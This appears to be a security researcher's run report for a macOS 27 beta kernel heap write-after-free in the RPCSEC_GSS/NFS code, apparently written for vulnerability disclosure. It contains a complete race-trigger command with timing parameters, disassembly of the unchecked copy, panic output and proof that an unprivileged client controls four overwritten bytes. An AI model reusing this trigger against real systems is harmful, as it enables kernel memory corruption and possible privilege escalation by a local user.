# Run 29: exact no-DTrace RPCSEC_GSS kernel write-after-free value proof

## Result

Run 29 proves the content source of the RPCSEC_GSS cross-generation heap
overwrite without DTrace, LLDB, a release oracle, or kernel memory access.

The allocator detected this post-free modification:

```text
[data.kalloc.32]: element modified after free
(off:0, val:0x00000000e046b601, sz:32, ptr:0xfffffe2fb57b45c0)
```

The caller's preserved AES context key and the host-captured RPC reply
independently reproduce that exact dword:

```text
body_sequence=100024
wire_mic=ae201fd1c09a4f7e7857dc0d
computed_hmac_sha1=ae201fd1c09a4f7e7857dc0dc8908ddd01b646e0
prefix_match=yes
overwrite_dword=0xe046b601
```

The packet carries only the valid 12-byte AES-CFX MIC prefix. The HMAC's last
four bytes are `01 b6 46 e0`; loaded as the kernel's little-endian dword, they
are exactly the allocator's `0xe046b601` modification. This is an exact value
equality, not a partial-byte match or statistical correlation.

## Security meaning

The uid501 client owns the authenticated GSS context and can compute the full
HMAC from its session key and request/reply data. The trigger itself does not
need the key-export diagnostic. The export only makes the write content
independently verifiable after the panic.

Combined with the current-build instruction audit, the run proves:

1. Allocation uses the old AES digest length 12 and requests 28 bytes.
2. Concurrent context teardown/replacement changes the live digest length to
   DES3's 20.
3. The final copy reloads 20 from the replacement generation without comparing
   it with the 12 used for allocation.
4. The write spans object offsets 16..35: eight bytes beyond the requested
   28-byte allocation and four bytes across the physical 32-byte zone slot.
5. The four cross-slot bytes are the exact caller-computable HMAC tail from a
   captured reply.

This establishes a deterministic-content four-byte kernel heap
write-after-free/cross-slot overwrite. It is not, by itself, an arbitrary
write-where primitive. The separately retained fd-flags grooming and
same-fileproc close-chain evidence addresses downstream target placement.

## Environment and reachability

- VM: macOS 27 beta 4 `26A5388g`
- Kernel: `xnu-13432.0.94.501.4~1/RELEASE_ARM64_VMAPPLE`
- Kernel UUID: `E324BD2E-ABD7-3384-BFCA-6CFD1435DC72`
- Trigger boot: `F2F78DC9-8010-4C20-BDC9-4740F7C09245`
- Attacker: local account uid 501, no sudo in the trigger
- Panicked task: `rgstockctx`, pid 974
- Boot args: `-zp keepsyms=1 amfi_get_out_of_my_way=1`

`-zp` supplied allocator corruption detection. It did not cause the race,
select a worker, alter the context, or supply the written value. Previous
no-DTrace stock runs reached active-HMAC faults and post-free modifications;
the passive exact-OOB run establishes the same sink on the unmodified kernel
path.

## Exact trigger geometry

```text
one AES RPCSEC_GSS context
32 integrity READDIRPLUS requests
dircount=786432, maxcount=786432
DATA base delay=3000 us
DATA stagger=5000 us
one valid DES3 CONTINUE_INIT at delay=0
```

Host command:

```sh
env RPC_GSS_STOCK_ENABLE_TRACE=0 \
  RPC_GSS_STOCK_CLIENT_NAME=rpc_gss_crypto_race_prearmed_gate \
  RPC_GSS_NFS_FH_FILE=export-root.vm84.fh \
  RPC_GSS_NFS_PROC=readdirplus \
  RPC_GSS_NFS_READDIRPLUS_DIRCOUNT=786432 \
  RPC_GSS_NFS_READDIRPLUS_MAXCOUNT=786432 \
  RPC_GSS_DATA_SERVICE=integrity \
  RPC_GSS_CONTINUE_DELAY_US=0 \
  RPC_GSS_CAPTURE_ALL_DATA_REPLIES=1 \
  RPC_GSS_CAPTURE_CONTEXT_KEYS=1 \
  RPC_GSS_WIRE_ORACLE_VERIFY=1 \
  ./run_nfs_stock_multicontext_batch.sh \
  stock_wire_oracle_aeskey_phase3_nodtrace_29 1 3000 0 32 5000
```

Before release, the scheduler required the context-key file to be nonempty and
called `/bin/sync`. This only made evidence survive a VM panic; it ran before
the race stage gate and did not influence worker selection.

## Rule Zero: current-build sink

Allocation generation:

```asm
0xfffffe0007511fe4  ldr w8,[x23,#0xc0]  ; old AES digest = 12
0xfffffe0007511fe8  add x1,x8,#0x10     ; request 28
0xfffffe0007512004  bl  kalloc_ext
0xfffffe0007512084  add x6,x8,#0x10     ; destination = allocation+16
0xfffffe000751209c  bl  krb5_mic_mbuf
```

Sink generation:

```asm
0xfffffe00075112ec  ldr w2,[x19,#0x78]  ; replacement DES3 digest = 20
0xfffffe0007511318  ldr x0,[sp]         ; allocation+16
0xfffffe000751131c  mov x1,x21          ; HMAC scratch
0xfffffe0007511320  bl  memcpy
```

There is no instruction comparing replacement length 20 against allocation
length 12, bounding it to `mic->length - 16`, retaining/locking the context,
or checking that allocation and copy values came from the same object
generation. Each individual digest length is legal; the missing bound is
cross-generation consistency.

## Wire evidence

The host pcap retained 25 complete 656820-byte replies before the panic. The
deterministic reassembler reported no sequence gaps or conflicting bytes for
the exact record:

`stock_wire_oracle_aeskey_phase3_nodtrace_29.rpc.flow25.port49177.record0.len656820.bin`

Record SHA-256:

`1ccec2d928db063ba2d923e10315502ceeddbbc1b1a212f50e75c93815a65eec`

All 25 complete records verify against the preserved key. The exact matching
record is the last complete reply, body sequence 100024.

Run `./verify_exact_control.sh` for the offline proof. It extracts the key,
verifies the on-wire MIC prefix, recomputes the full HMAC, checks the hidden
dword, and checks the panic value.

## Primary hashes

- `.contents.panic`:
  `66c853a516bc1615d8301ef263b6ccd5b5ab78e29363e2b5a98c27a4ec62a321`
- Full panic report:
  `7654529d99e83d9eb21c95bdc01ea70ad4d885afef1e2549d47c7439ce5dd22d`
- Host pcap:
  `3df5fbe48f14c69aebf828fe48c417427613ae62cfa9433dcca7d7dbeca776b6`
- Preserved AES-key evidence:
  `2c77121f3d43f9ef0187f457fcb5ec76b072104c7c646637cfff6e1cb5971afd`
- AES verifier source:
  `418fc38c599dba9308ae01fd250d3fb951ced6876c1d421ddbbd62428d4ca7dd`
- Trigger source:
  `73b204336470dd1f3ef3bdcf15115ac5ef9d98310bf60706b6e66faaab732f49`
- Remote scheduler:
  `88da7e6ad63a44261b909d627f07a5eca2e181728270716c9be4056f1a3e515f`

## Claim boundary

Safe report wording:

> On macOS 27 beta 4, an unprivileged authenticated RPCSEC_GSS client
> naturally caused root `nfsd` to copy a 20-byte HMAC result into storage sized
> for a 12-byte digest from an older context generation. A host packet capture
> and the caller's preserved AES subkey reproduce the allocator's exact
> four-byte post-free modification from the wire-omitted HMAC tail.

Do not call this arbitrary write-what-where. The strongest proven primitive in
this run is deterministic-content four-byte cross-slot heap overwrite after
free, with exact value control/correlation and unprivileged reachability.
